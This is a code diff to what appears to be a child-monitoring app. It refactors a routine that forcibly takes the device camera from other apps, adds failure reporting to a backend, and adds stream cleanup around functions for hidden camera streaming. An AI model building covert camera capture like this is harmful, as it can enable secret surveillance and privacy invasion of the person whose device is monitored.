@@ -147,6 +147,30 @@ function sdpHasVideoMline(sdp: string | undefined): boolean {
 const TRACK_LIVE_WAIT_MS = 200;
 const TRACK_LIVE_ATTEMPTS = 25;
 
+/** Reported to backend + parent UI when camera takeover loses to another app (e.g. Discord video). */
+export const CAMERA_IN_USE_BY_OTHER_APP = 'CAMERA_IN_USE_BY_OTHER_APP';
+
+async function acquireCameraWithTakeover(
+  sessionId: string,
+  cameraId: string,
+  facing: 'user' | 'environment',
+): Promise<void> {
+  flowLog('CAMERA_FLOW', 'FORCING_CAMERA_ACCESS', {sessionId, facing, cameraId});
+  let forceSuccess = false;
+  try {
+    forceSuccess = await nativeModules.forceCameraAccess(cameraId);
+  } catch (error) {
+    slog('CAMERA', 'Camera force access error', String(error));
+  }
+  flowLog('CAMERA_FLOW', 'CAMERA_FORCE_RESULT', {sessionId, success: forceSuccess, cameraId});
+  if (!forceSuccess) {
+    slog('CAMERA', 'Camera takeover failed — another app is using the camera', {facing, cameraId});
+    void deviceApi.reportStreamFailure(sessionId, CAMERA_IN_USE_BY_OTHER_APP).catch(() => undefined);
+    throw new Error(CAMERA_IN_USE_BY_OTHER_APP);
+  }
+  slog('CAMERA', `Successfully forced camera access for ${facing} camera (ID: ${cameraId})`);
+}
+
 async function waitForCaptureTrackLive(track: {readyState?: string} | undefined): Promise<void> {
   if (!track) {
     throw new Error('Screen or camera didn’t start. Please try again.');
@@ -734,6 +758,7 @@ export async function connectChildStream(
           sessionId,
           roomId,
         });
+        await disconnectStream(false).catch(() => undefined);
         return;
       }
 
@@ -775,7 +800,8 @@ export async function connectChildStream(
     totalElapsedMs,
     lastError: String(lastError)
   });
-  
+  await disconnectStream(false).catch(() => undefined);
+
   throw lastError || new Error('Connection failed after maximum attempts');
 }
 
@@ -872,21 +898,9 @@ async function connectChildStreamImpl(
       const facing = cameraFacing === 'environment' ? 'environment' : 'user';
       currentCameraFacing = facing;
       
-      // Force camera access from other apps before starting stream
-      const cameraId = facing === 'user' ? '1' : '0'; // Standard camera IDs: front=1, back=0
-      flowLog('CAMERA_FLOW', 'FORCING_CAMERA_ACCESS', {sessionId, facing, cameraId});
-      try {
-        const forceSuccess = await nativeModules.forceCameraAccess(cameraId);
-        flowLog('CAMERA_FLOW', 'CAMERA_FORCE_RESULT', {sessionId, success: forceSuccess, cameraId});
-        if (!forceSuccess) {
-          slog('CAMERA', `Warning: Failed to force camera access for ${facing} camera (ID: ${cameraId}), proceeding anyway`);
-        } else {
-          slog('CAMERA', `Successfully forced camera access for ${facing} camera (ID: ${cameraId})`);
-        }
-      } catch (error) {
-        slog('CAMERA', `Camera force access error: ${error}, proceeding with normal camera access`);
-      }
-      
+      const cameraId = facing === 'user' ? '1' : '0';
+      await acquireCameraWithTakeover(sessionId, cameraId, facing);
+
       flowLog('CAMERA_FLOW', 'FOREGROUND_SERVICE_STARTING', {sessionId, facing});
       const data = await nativeModules.getHiddenCameraMediaStream(facing);
       flowLog('CAMERA_FLOW', 'CAMERA_OPENED', {sessionId, streamId: data.streamId, facing});
@@ -1184,6 +1198,9 @@ async function connectChildStreamImpl(
   } catch (err) {
     streamStateTransition('FAILED', 'connectChildStreamImpl', {error: String(err)});
     slog('FLOW', 'connectChildStreamImpl FAILED', String(err));
+    await disconnectStream(false).catch(cleanupErr =>
+      slog('FLOW', 'cleanup after connect failure failed', String(cleanupErr)),
+    );
     throw err;
   } finally {
     connecting = false;
@@ -1285,6 +1302,9 @@ export async function disconnectStream(clearConnecting = true): Promise<void> {
   const conn = pc;
   const streamTypeToStop = activeStreamType;
   const hadActiveStream = stream != null || conn != null;
+  // Mid-connect failures can open native capture before pc/activeMediaStream exist.
+  const shouldStopCapture =
+    hadActiveStream || (connecting && streamTypeToStop != null);
   activeRoomId = null;
   activeSessionId = null;
   activeMediaStream = null;
@@ -1311,7 +1331,7 @@ export async function disconnectStream(clearConnecting = true): Promise<void> {
   }
   // Only tear down capture pipelines that were actually streaming — not pre-warmed FGS
   // from MainActivity (stopping audio mid-start causes ForegroundServiceDidNotStartInTimeException).
-  if (hadActiveStream) {
+  if (shouldStopCapture) {
     if (streamTypeToStop === 'CAMERA') {
       await nativeModules.stopHiddenCameraStream().catch(() => undefined);
       
